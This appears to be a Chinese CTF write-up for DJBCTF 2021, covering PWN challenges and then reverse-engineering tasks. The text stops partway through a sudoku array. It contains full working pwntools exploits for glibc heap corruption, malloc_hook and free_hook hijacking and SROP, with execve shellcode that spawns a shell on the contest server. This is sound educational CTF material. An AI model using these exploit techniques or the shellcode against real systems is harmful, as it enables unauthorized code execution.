# 2021 DJBCTF Writeup

阅读量 **338584**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-29 15:30:45

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t015c269280a114d98f.jpg)

个人赛，最后总排名第三，AK了PWN和RE，Web挖到了一处rce，Misc把签到题做了一下。

## PWN

###  big_family

程序存在 **off by null** 漏洞，但是对申请的size有限制，申请范围在0x10~0x46之间，所以对于利用方式也有所限制。

申请这个范围，意味着size位在0x21-0x51之间，刚开始做的时候没想到能申请到0x51的size，故一直没想到办法，通过这个博客学习到了一种之前没有实战过（但想到过）的利用思路：<http://blog.eonew.cn/archives/1212>。通过劫持main_arena上的top来申请到想要的位置，但是在这之前，我们先需要通过合理的布局来构成
**chunk overlapping** 。

**如何来构成chunk overlapping？**

**先来让unsorted bin中有堆块**

利用 **off by one** 的前提一般都是需要有unsorted
bin中的堆块，但是由于这道题申请size的限制，所以我们申请的堆块都会在fastbin中，这时候就需要一些其他操作来让其进入到unsorted bin中。

我们需要利用 **scanf** 来让fastbins中的chunk进入到unsorted bin中。也就是利用 **scanf**
接收时会调用malloc进行申请堆块，而当我们输入的长度大于0x400（largebin的范围），在申请的时候就会先去执行
**malloc_consolidate** ，在这个函数内会调用 **clear_fastchunks** 来清空fastbin，并且
**根据size从小到大依次** 让fastbin chunk进入到unsorted
bin中，并且判定是否可以合并，如果有相邻的fastbin则发生合并。而在之后遍历unsorted bin的时候，又会先从unsorted
bin中脱链根据大小来进入到small bin或者largebin，如果大小不合适的话，就会存在于这两者其中的一个。

**所以在通常情况下，执行scanf的表象就是fastbin中的元素都进入到smallbin中去了。**

**注意：在触发malloc_consolidate后，进入unsorted bin的fastbin的下一个堆块的prev_inuse =
0，并且被写入了prev_size信息。**

**如何利用？**

由于这次加入了 **scanf** 来作为构造的限制，所以一般的 **off by one**
的方法都不再适用了。这次我们需要的就是我之前就在博客中所提及的 **堆收缩（poison_null_byte）** 的方法。之前用的情况是在无法控制
**prev_size**
的时候，而这次是在于如果某个堆块的size在0x101，那么这个堆块一定是在free状况下的，因为我们最多只能申请0x51的size，这样的话我们就无法控制再次free这个堆块来触发unlink。

所以利用 **poison_null_byte**
的方法从而来让堆块收缩，这样的话，由于写prev_inuse和prev_size都是根据当前堆块的size来计算下个堆块的位置来写的，在收缩之后，由于计算得出的下个堆块的位置错误，
**当我们再次申请那部分（被收缩）的堆块的时候，prev_inuse和prev_size无法写入正确的位置。**

接下来我们只要让下面位置的堆块（通过 **malloc_consolidate** 从而标记过prev_inuse = 0的堆块）进入到unsorted
bin，由于prev_inuse = 0，系统根据prev_size去找前面的堆块去合并，从而触发unlink。

**leak libc**

有了chunk overlapping之后，稍微构造一下，就能通过unsorted bin在未free的堆块上写一个main_arena +
88，然后用自带的show函数就可以leak了。

**劫持main_arena**

又有了libc之后，我们可以考虑修改0x51size的chunk的fd到main_arena上的fastbinsY那块区域，我们可以构造，让
**fastbinY** 上有内容，且当这个内容的
**开头为0x56的时候（利用开启PIE后的随机性，有1/3的概率，至于为什么是这个数，可以看一下我house of storm里面写的分析）**
，那么我们就可以成功劫持到这块区域，其实这里可以利用的指定size的fastbinsY的限制挺多的。

比如说这道题（结合调试来看）：

**max限制**

1.我们选择的size至少要小于0x51，因为我们最多只能申请0x51，如果劫持0x51的话，在第二次申请的时候，fastbinsY中0x51size的内容开头就会变成0x7F，不符要求

2.其次我们必须要小于0x41，因为0x41的内容和0x51是相邻的，而我们又需要错位来绕过size判定，而他又是与0x51相邻的话，那么size那部分会有0x51size的内容。

所以综合以上两点，我们能够选择的只有0x21和0x31的size用于劫持，这里选择的是0x21的size，他的位置在 **main_arena +
0xD** 。

**min限制**

3.长度的限制，如果选择使用劫持较小的size，比如选用0x21的size就要考虑到这个问题，也就是能否修改到main_arnea ->
top的内容，有较大的可能性（如果申请size的时候要求小于0x3B + 8 = 0x43就修改不到了）

由于这些东西都是在调试中发现的问题，再去改前面申请的size（毕竟在做题的时候不会想这么全面），所以刚开始的时候没有发现这个问题，浪费了很长时间，而且在看ex师傅在那道题目的exp的时候也看不懂为什么size要变来变去的，直到自己亲手调试了才会明白，建议各位师傅可以亲手试试，下次做题的时候就会流畅很多了。

**修改main_arena -> top**

劫持之后我们就可以尝试修改main_arena -> top的内容了。

通过调试找到main_arena的位置，如果你劫持的是main_arnea +
0xD的0x18的size的fastbinY[0]，那么就要相隔0x3B个数据再写劫持的位置。

**确定劫持top的位置**

由于在malloc的时候会检测top
chunk的size位是否足够，如果不足够则会重新申请一块区域，所以我们一定要确保选择劫持的top位置，有足够大的size。

比如，如果我们要劫持 **free_hook的话，那么我们可以考虑** free_hook –
0xb58位置，但实际上这个位置距离__free_hook太远了，在这道题显然不适用。

所以这道题劫持的是 **malloc_hook，并且选择** malloc_hook –
0x28的这个位置，这个位置的size信息也恰好足够大，符合申请调用。

接下来只需要几次申请（先把fastbinsY和unsorted bin中的内容都申请完），就可以从top
chunk中进行申请，然后我们就可以申请到malloc_hook的位置。

不过这道题，直接上one_gadget无法打通，需要用一个小技巧，也就是用 **realloc_hook** 来调栈，大概也可以用触发double
free的方法吧（未测试）。

**最后稍微吐槽一下，这个libc版本好像不是很大众的吧，居然不给libc。**

**EXP**

    
    
    from pwn import *
    from LibcSearcher import *
    libc = ELF('/home/wjh/LibcSearcher/libc-database/db/hitcon-libc-2.23.so')
    context.log_level = "debug"
    def choice(idx):
        r.sendlineafter("Choice:", str(idx))
    def add(size, content = '\n'):
        choice(1)
        r.sendlineafter("build?", str(size))
        r.sendlineafter("house?", content)
    def delete(idx):
        choice(2)
        r.sendlineafter("remove?", str(idx))
    def show(idx):
        choice(3)
        r.sendlineafter("view?", str(idx))
    def pie(addr=0):
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
        return text_base + addr
    def pwn():
        add(0x28)  # 0
        add(0x40)  # 1
        add(0x40)  # 2
        add(0x40)  # 3
        add(0x40)  # 4
        add(0x40)  # 5
        add(0x18)  # 6
        delete(0)
        delete(1)
        delete(2)
        delete(3)
        delete(4)
        choice('5' * 0x400)
        add(0x28, 'a' * 0x28)  # 0
        add(0x38)  # 1
        add(0x38)  # 2
        add(0x40)  # 3
        add(0x28)  # 4
        delete(1)
        delete(5)
        choice('5' * 0x400)
        add(0x38)  # 1
        show(2)
        main_arena_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 88
        malloc_hook_addr = main_arena_addr - 0x10
        #libc = LibcSearcher('__malloc_hook', malloc_hook_addr)
        #libc_base = malloc_hook_addr - libc.dump('__malloc_hook')
        libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
        realloc_addr = libc_base + libc.sym['realloc']
        #realloc_addr = libc_base + libc.dump('realloc')
        one = [0x45216, 0x4526a, 0xf0274, 0xf1117]
        one_gadget = libc_base + one[3]
        delete(3)
        add(0x28)  # 3
        add(0x18, p64(0) + p64(0x51) + p64(main_arena_addr + 0xD))  # 7
        #heap = pie(0x202060)
        #log.success("heap: " + hex(heap))
        log.success("main_arena_addr: " + hex(main_arena_addr))
        add(0x40)
        delete(0)
        add(0x43, '\x00' * 0x3b + p64(malloc_hook_addr - 0x28))
        add(0x40) #8
        add(0x40) #9
        add(0x40) #10
        add(0x40, p64(0) * 2 + p64(one_gadget) + p64(realloc_addr + 0x6)) #11
        log.success("one_gadget: " + hex(one_gadget))
        #gdb.attach(r, "b *" + hex(one_gadget))
        choice(1)
        r.sendlineafter("build?", str(0x20))
        r.interactive()
    while True:
        try:
            #r = process('./family')
            r = remote('111.231.70.44', 28003)
            pwn()
        except EOFError:
            pass
    

###  easy_note

libc2.27，没开pie保护且是Partial RELRO

**题目信息**

这道题和一般的堆题不太一样，他是用mmap申请了一个大堆，然后之后写堆块内容都是从他的那块上来，不过也不彻底，还是有一个malloc用于储存临时的结构数据。

他的这个堆块的结构大概是这样的：

offset | name  
---|---  
0x0 | size  
0x8 | canary(4 bytes)  
0x10 | content_ptr  
  
程序开了另外一个线程，用于检测他自己随机的 **canary** 是否被更改。

**利用方法**

并且程序存在可以自己输入size的功能，这就造成了溢出，但是由于他这个 **canary** 的保护，直接修改 **content_ptr** 是不可行的。

接下来我们就要把注意力转移到如何泄露出canary的方向上，在show函数中，程序根据这里的size去输出content_ptr的内容，而我们通过堆溢出又正好可以修改这个size的信息，那么我们就可以把size改大，然后泄露canary的内容，在下次溢出的时候保证canary不变的同时来修改content_ptr来实现任意读写。

由于程序没有开 **FULL RELRO**
，所以我们这里可以考虑把content_ptr修改成got表上的free函数，从而show一次就可以leak出libc了。

刚开始的时候考虑修改 **__malloc_hook**
为one_gadget来传参，结果意料之外的是居然没有一个one_gadget可以成功getshell，甚至在利用realloc来调栈的方法都没有一个可行，所以只能考虑更为考虑的
**system** 函数。

然后我们通过修改free函数为system，这样在下次调用free的时候，由于在堆块头部的信息就是申请的size大小，这是我们可控的内容，利用类似ret2text的思想，传入sh的16进制内容，成功getshell。

这里还有一种方法，就是利用 **scanf** 函数在申请大于0x400的chunk后，使用完毕会free掉，如果我们让 **scanf**
函数的内容中存在 **sh（类似 ;sh; ）**
。那么也可以达到getshell的目的。但是要注意，scanf调用的free函数，不会走got表，所以要修改__free_hook才能有用。

**EXP**

    
    
    from pwn import *
    from LibcSearcher import *
    #r = process('./easy_note')
    r = remote('111.231.70.44', 28008)
    elf = ELF('./easy_note')
    context.log_level = "debug"
    
    def choice(idx):
        r.sendlineafter(">", str(idx))
    
    def add(size):
        choice(1)
        r.sendlineafter("size:", str(size))
    
    def show(idx):
        choice(2)
        r.sendlineafter("index:", str(idx))
    
    def edit(idx, content='a'):
        choice(3)
        r.sendlineafter("index:", str(idx))
        r.sendlineafter("size:", str(len(content)))
        r.send(content)
    
    def rw(idx, addr, size, content='None'):
        add(0x18)
        edit(idx, 'a' * 0x18 + p64(0x50))
        show(idx)
        r.recvuntil('a' * 0x18 + p64(0x50))
        canary = u32(r.recv(4))
        edit(idx, 'a' * 0x18 + p64(size) + p64(canary) + p64(addr))
        show(idx)
        if content != 'None':
            edit(idx, content)
    
    rw(0, elf.got['free'], 0x8)
    free_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    libc = LibcSearcher('free', free_addr)
    libc_base = free_addr - libc.dump('free')
    free_hook_addr = libc_base + libc.dump('__free_hook')
    edit(0,  p64(libc_base + libc.dump('system')))
    add(0x6873)
    r.interactive()
    

###  easyrop

**SROP模版题**

**（保护全红，栈溢出0x400）**

刚开始的时候路走歪了，没想到 **SROP**
，其实看到这么大栈溢出，应该自然的就知道是SROP了，毕竟良心出题人还是少的，非必须也不会给这么大（相对应的看到很小的栈溢出就想到栈迁移）。

以为是要考察在 **打远程的情况下可以利用fd = 0或1都能利用sys_write来输出内容**
，来泄露栈地址来操作，可惜的是没给libc，这种方法虽然可行，但是概率大概是1/100（大概），也就没有继续尝试下去了，有兴趣的朋友可以看看。

    
    
    from pwn import *
    context(os = 'linux', arch = 'amd64', log_level = 'debug')
    #r = process('./easyrop')
    while True:
    try:
    r = remote('111.231.70.44', 28178)
    syscall_addr = 0x4000DB
    main_addr = 0x4000B4
    ret_addr = 0x4000DE
    #gdb.attach(r, "b *0x4000DB")
    r.send('a' * 0x40 + p64(syscall_addr) + p64(1) + p64(main_addr))
    stack = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    stack -= 0x1639
    log.success("stack: " + hex(stack))
    shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    r.send('a' * 0x40 + p64(stack) + (0x400 - 0x40 - 0x8 - len(shell)) / 0x8 * p64(ret_addr) + shell)
    r.send('cat flag')
    #log.success("stack: " + hex(stack))
    r.interactive()
    except:
    pass
    

之前接触的SROP都是堆题利用setcontext来ROP，也算是少数的接触syscall的SROP吧（虽然这才是正规的SROP），之前博客也有一道SROP的题目，我写了个非预期。

exp没什么好说的，由于有RWX段，我们可以直接写shell，然后跳到那里去执行，不过记得给栈留点地方，不然shellcode用栈的时候会覆盖到一部分内容。

**EXP**

    
    
    from pwn import *
    r = process('./easyrop')
    #r = remote('111.231.70.44',28888)
    context.log_level = "debug"
    context.arch = "amd64"
    frame = SigreturnFrame()
    frame.rax = 0 #sys_read
    frame.rdi = 0
    frame.rsi = 0x6000E0
    frame.rdx = 0x200
    frame.rip = 0x4000DC
    frame.rsp = 0x6000E0 + 0x100
    #gdb.attach(r, "b *0x4000DB")
    payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    r.sendafter("Welcome to DJB easyrop!\n", 'a' * 0x40 + p64(0x4000DB) + p64(0xF) + str(frame))
    r.send(payload.ljust(0x100, '\x00') + p64(0x6000E0))
    r.interactive()
    

###  **virtual**

观察主程序，发现有一个循环接收内容：

![](https://p4.ssl.qhimg.com/t0194accbdfae9a00bb.png)

逻辑大概是这样的，读入一串code（长度最多为0x100），然后通过handle函数来解析读取的数据内容，这种读入一共只有两次。

**所以不难想到，如果要控制程序命中率100%的话，我们第一次的code必须要leak libc，而第二次就是尝试改相应的其他位置。**

**执行函数分析**

handle函数非常复杂，代码逻辑我根据题目名字猜测是个类似虚拟机的东西，由于伪代码逻辑混乱，故尝试自己把代码进行调整

首先关注到两个亮眼的位置， **malloc和free**

![](https://p5.ssl.qhimg.com/t012361faaa8abd6311.png)

从这里猜测data + 6存放的是指针的信息，而data + 5也是指针信息，data + 4是堆块的结束位置，在free的时候三者都被清空。

在5这个位置，发现可以输出和输入信息，其中的read功能可以用来leak，这也是唯一的leak点。

![](https://p5.ssl.qhimg.com/t0133bee0b035e1df5b.png)

在4这个为位置，通过第二个传入的内容，会有不同大小的修改内容

![](https://p1.ssl.qhimg.com/t01c31fe30e0a9f2fc8.png)

在3这个位置，会有不同程度的增加内容

![](https://p5.ssl.qhimg.com/t010e83791ab70977fe.png)

没啥用

![](https://p4.ssl.qhimg.com/t0168708ba75e97a501.png)

在1这个位置，有不同程度的对data + 5指针进行修改，且在修改之前有个检测

![](https://p0.ssl.qhimg.com/t014d390334bebbc138.png)

在0这个位置，有不同程序的对data + 5的数据进行修改，且修改的内容受到了调控

![](https://p4.ssl.qhimg.com/t01e6ae017ea027db96.png)

**漏洞点**

代码中存在的两个检测如下图

**check65写错了，按照我的理解，应该是如果data + 6 > data + 5那么就退出，这就导致了接下来漏洞的发生，程序可以通过减少data +
5来向前溢出。**

![](https://p4.ssl.qhimg.com/t0106662415fb1ad902.png)

**如何利用？**

首先可以观察到一个特征就是，在这个switch中，返回值就代表着这个操作所需的参数长度，且以字节为单位，这可以方便我们编写程序和了解程序流程。

**第一次构造**

我们先考虑第一次的code要如何构造，第一次构造我们需要泄露libc，而我们又有show函数，所以我们要考虑如何绕过tcache，让一个堆块进入到unsorted
bin中，如果要绕过tcache的话，那么意味着我们要让tcache填满，但是对于这道题来说，
**我们一次性最多只能申请一个堆块，如果要申请下一个必须先把这个堆块释放掉。**

所以我们只能考虑如何来一次修改tcache struct中的counts数组对应idx内容大于7。

首先我们可以通过向前溢出一部分距离（受限于最多执行0x100的code），但是溢出的距离不足以来修改到tcache
struct的内容，但是我想到了一个巧妙的方法。

因为data结构实际上也是储存在堆中的，在我们向前溢出的过程中，也可以溢出到那部分的内容，但是我们只能修改一次（因为我们要修改的是 **data + 5**
，而向前溢出的指针也是这个），所以我考虑修改 **data + 5**
的倒数第二个字节，让他减少1，这样就相当于减少了0x100（32个操作，64个字节），在这样的方法下，我们足以碰到counts数组，接下来只需要修改它为
**0xFF** ，那么我们在接下来free的时候就不会进入到tcahce而是进入到unsorted
bin，然后我们再次申请一块在tcache中不存在的堆块，那么就会去unsorted bin中申请，这个申请得到的数据上存在unsorted
bin残留的main_arena指针，我们通过再次申请然后show一下就可以拿到libc上的地址了。

在这之后，我发现距离0x100还有一段空间，于是我决定不浪费这些空间，在第一段payload中干一些第二段的事情。

**第二次构造**

由于有在第一次构造的一些帮忙，在第二次构造的时候，实际上我们使用的空间是大于0x100的。所以我们可以考虑直接往前溢出，直接溢出到 **tcache
struct** ，然后修改某个的内容为 **__free_hook** 的地址，再次申请就可以拿出来 **__free_hook**
的地址了，拿到之后我们把他改成system，再free一次，就可以getshell了。

但是好像还发现一个问题，我们没有在堆块写入system执行内容，解决这个问题非常容易，只需要在 **free_hook –
0x8的地方开始申请地址，那么就它之前0x8字节写入shell的内容即可，后0x8个字节来修改free_hook** 。

**总结**

这道题的难点主要在于要理清程序的结构，合理的调试和清晰的分析。最终才能够构造出巧妙的exp来getshell。个人感觉这道题出的很不错，学到了！。

**PS:这道题虽然是glibc2.27，但其实是新版本的2.27，对于tcache来说增加了key用于检测double
free。建议调试过程中使用2.29来调试，与这个版本几乎没差别。**

**EXP**

    
    
    from pwn import *
    from LibcSearcher import *
    context.log_level = "debug"
    
    def write5(data):
        all = p8(0)
        l = len(data)
        if l == 1:
            all += p8(0x10)
        elif l == 2:
            all += p8(0x20)
        elif l == 4:
            all += p8(0x30)
        elif l == 8:
            all += p8(0x40)
        all += data
        return all
    
    def sub_helper(l):
        all = p8(1)
        if l == 1:
            all += p8(0x10)
        elif l == 2:
            all += p8(0x20)
        elif l == 4:
            all += p8(0x30)
        elif l == 8:
            all += p8(0x40)
        return all
    
    def show():
        return p8(5) + p8(2)
    
    def add(size):
        return p8(6) + p8(size)
    
    def free():
        return p8(7)
    
    def brk():
        return p8(8)
    
    def sub5_size(size):
        all = ""
        while size != 0:
            if size >= 8:
                all += sub_helper(8)
                size -= 8
            elif size >= 4:
                all += sub_helper(4)
                size -= 4
            elif size >= 2:
                all += sub_helper(2)
                size -= 2
            else:
                all += sub_helper(1)
                size -= 1
        return all
    
    def sub_one():
        return p8(4) + p8(0x10)
    
    # r = process('./virtual')
    r = remote('111.231.70.44', 28112)
    # part 1
    payload = add(0x88) + free() + add(0x18) + free() + add(0x88) + sub5_size(0x127) + sub_one() + sub5_size(
        0x172) + write5('\xFF') + free() + add(0x28) + show() + sub5_size(0x100) + brk()
    r.sendafter("code :", payload)
    # leak libc
    malloc_hook_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 224 - 0x10
    log.success("malloc_hook_addr: " + hex(malloc_hook_addr))
    libc = LibcSearcher('__malloc_hook', malloc_hook_addr)
    libc_base = malloc_hook_addr - libc.dump('__malloc_hook')
    log.success("libc_base: " + hex(libc_base))
    free_hook_addr = libc_base + libc.dump('__free_hook')
    log.success("free_hook_addr: " + hex(free_hook_addr))
    system_addr = libc_base + libc.dump('system')
    log.success("system_addr: " + hex(system_addr))
    # part 2
    payload2 = sub5_size(0x260) + write5(p64(free_hook_addr - 0x8)) + free() + add(0x18) + write5('/bin/sh\x00') + write5(
        p64(system_addr)) + free() + brk()
    r.sendafter("code :", payload2)
    r.interactive()
    

## RE

###  A-Maze-In

有个迷宫，但是我也没搞懂怎么样的迷宫，根据程序逻辑，写了个DFS就秒掉了（带了个记忆化搜索）。

    
    
    #include <cstdio>
    unsigned char ida_chars[] =
    {
      0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00,
      0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00,
      0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00,
      0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00
    };
    char way[34];
    int vis[35][35][35];
    int dfs(int x, int v5, int v4)
    {
        if (vis[x][v5][v4]) return vis[x][v5][v4];
        if (x == 34)
        {
            if (v5 == 7 && v4 == 4)
                return vis[x][v5][v4] = 1;
            return vis[x][v5][v4] = 2;
        }
        if (ida_chars[32 * v5 + 4 * v4] == 1)
            if (dfs(x + 1, v5 - 1, v4) == 1)
            {
                way[x] = 'U';
                return vis[x][v5][v4] = 1;
            }
    
        if (ida_chars[32 * v5 + 1 + 4 * v4] == 1)
            if (dfs(x + 1, v5 + 1, v4) == 1)
            {
                way[x] = 'D';
                return vis[x][v5][v4] = 1;
            }
    
        if (ida_chars[32 * v5 + 2 + 4 * v4] == 1)
            if (dfs(x + 1, v5, v4 - 1) == 1)
            {
                way[x] = 'L';
                return vis[x][v5][v4] = 1;
            }
    
        if (ida_chars[32 * v5 + 3 + 4 * v4] == 1)
            if (dfs(x + 1, v5, v4 + 1) == 1)
            {
                way[x] = 'R';
                return vis[x][v5][v4] = 1;
            }
        return vis[x][v5][v4] = 2;
    }
    int main()
    {
        dfs(0, 0, 3);
        for (int i = 0; i <= 33; i++)
            printf("%c", way[i]);
    }
    

###  Matara Okina

又到了我最喜欢的APK环节了（毕竟这个调试环节弄了这么久）。

可惜这道题没用到，拖到JEB看了一下，发现了下面这个函数

![](https://p4.ssl.qhimg.com/t012c56cf3db62e26e7.png)

看到有个加密环节，虽然不知道怎么调用到这个函数，但是先把这个加密给处理了吧。就是一个简单的对称异或加密:

    
    
    #include <cstdio>
    #include <cstring>
    int main()
    {
        char ans[] = "@lgvjocWzihodmXov[EWO";
        for (int idx = 0, x; idx < (strlen(ans) + 1) / 2; idx = x)
        {
            x = idx + 1;
            ans[idx] = ans[idx] ^ x;
            int v3 = strlen(ans) - 1 - idx;
            ans[v3] = ans[v3] ^ x;
        }
        printf("%s", ans);
        return 0;
    }
    

得到内容： **Android_scheme_is_FUN**  
搜索 **scheme** ，发现这是一种安卓中有的一种交互协议，用于从浏览器中跳转到这个应用，配置信息在 **Manifest** 中

![](https://p3.ssl.qhimg.com/t01d14012cf9f33f75c.png)

找到关键信息：

    
    
    <data android:host="p4th" android:path="/70/1nput" android:scheme="sh0w"/>
    

构造连接： **sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN**  
在模拟器的浏览器中访问，就会跳转到应用中执行，并且给出了flag格式

![](https://p4.ssl.qhimg.com/t01151afc1d687eb553.png)

这里input就真是整个链接…所以逆向so也没啥用。

**flag{sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN_1635b71e036d}**

###  anniu

下载之后有一个灰色的按钮，用一些控件助手，把按钮解禁即可得到flag。

###  warmup

第一次做这种数独的题目，观察程序逻辑，发现是16*16的数独。

谷歌找到一个解数独的网站：<https://sudokuspoiler.azurewebsites.net/Sudoku/Sudoku16>

发现网站是要一个一个输入，有点慢，利用fd抓包之后，发现网站上传了一个数独的数据。

编写程序输出内容（0xFF相当于为空，也就是要填的，再把输出内容”256”替换成””即可）：

    
    
    #include <cstdio>
    #include <cstring>
    unsigned char byte_40A0[16][16] =
    {
      0x08, 0x0E, 0xFF, 0x0C, 0x09, 0x0D, 0xFF, 0x01, 0x0A, 0x0F,
      0x03, 0x0B, 0x00, 0x02, 0xFF, 0x04, 0x01, 0x06, 0x03, 0x02,
      0x05, 0x0A, 0x07, 0x00, 0x08, 0x09, 0xFF, 0x04, 0x0F, 0x0E,
      0x0B, 0x0D, 0x0A, 0x00, 0xFF, 0x0D, 0x04, 0x0F, 0x03, 0x0B,
      0x07, 0x05, 0x0E, 0x02, 0x06, 0x08, 0x0C, 0x01, 0x04, 0x0B,
      0x05, 0x0F, 0xFF, 0x02, 0xFF, 0x0C, 0x06, 0x0D, 0x01, 0x00,
      0xFF, 0x0A, 0x03, 0x09, 0x02, 0x0A, 0xFF, 0x03, 0x0D, 0x00,
      0x0B, 0x05, 0x0C, 0xFF, 0x09, 0x01, 0xFF, 0x0F, 0x07, 0x0E,
      0x0D, 0x07, 0x0C, 0x0B, 0x0F, 0x0E, 0x0A, 0x08, 0x00, 0xFF,
      0x05, 0x03, 0x09, 0x06, 0x01, 0x02, 0xFF, 0x01, 0x0F, 0xFF,
      0x0C, 0x09, 0x04, 0x06, 0x02, 0x0E, 0x0D, 0xFF, 0xFF, 0x03,
      0x0A, 0xFF, 0x09, 0x04, 0x06, 0x0E, 0x02, 0x07, 0x01, 0x03,
      0x0B, 0x08, 0x0A, 0x0F, 0x05, 0xFF, 0x00, 0x0C, 0xFF, 0x03,
      0x0A, 0x07, 0x0E, 0x08, 0x0C, 0x04, 0x09, 0xFF, 0x00, 0x0D,
      0x02, 0xFF, 0x06, 0xFF, 0x0C, 0x09, 0x01, 0xFF, 0x0B, 0x03,
      0x0F, 0x0D, 0x0E, 0x0A, 0xFF, 0xFF, 0x08, 0x00, 0x04, 0x07,
      0x06, 0x0D, 0x00, 0x08, 0x0A, 0x01, 0x02, 0xFF, 0xFF, 0x07,
      0x04, 0x05, 0x0C, 0x0B, 0xFF, 0x0F, 0x0B, 0x02, 0x0E, 0xFF,
